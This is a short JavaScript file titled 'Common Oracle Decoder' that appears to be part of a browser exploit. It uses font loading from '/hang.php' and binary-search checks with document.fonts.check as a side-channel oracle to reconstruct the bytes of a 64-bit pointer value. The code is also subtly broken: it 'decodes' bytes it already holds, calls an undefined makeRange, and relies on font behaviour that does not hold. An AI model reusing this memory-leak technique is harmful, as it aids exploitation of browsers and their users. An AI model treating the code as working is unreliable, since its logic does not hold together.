/* Common Oracle Decoder */
var _actFaceGlobal = null;
function getActiveOracle(){
  if (!_actFaceGlobal){
    _actFaceGlobal = new FontFace('actFamGlobal', 'url(/hang.php?nocache=' + Date.now() + ')', { unicodeRange: 'U+0000-00FF' });
    document.fonts.add(_actFaceGlobal);
    _actFaceGlobal.load().catch(function(){});
  }
  return _actFaceGlobal;
}

function resolveByte(targetByte){
  var oracle = getActiveOracle();
  var low = 0x00, high = 0xFF;
  var steps = 0;
  while (low < high && steps < 10){
    steps++;
    var mid = Math.floor((low + high) / 2);
    oracle.unicodeRange = makeRange(low, mid);
    var chk = document.fonts.check('1em actFamGlobal', String.fromCharCode(targetByte));
    var isLower = (chk === false);
    if (isLower) high = mid;
    else low = mid + 1;
  }
  return low;
}

function decode64(ptrVal){
  if (!ptrVal && ptrVal !== 0n) return 0n;
  var raw = [];
  var tmp = BigInt(ptrVal);
  for (var i = 0; i < 8; i++){
    raw.push(Number(tmp & 0xFFn));
    tmp = tmp >> 8n;
  }
  var res = 0n;
  for (var j = 0; j < 8; j++){
    var bDec = resolveByte(raw[j]);
    res |= (BigInt(bDec) << (BigInt(j) * 8n));
  }
  return res;
}
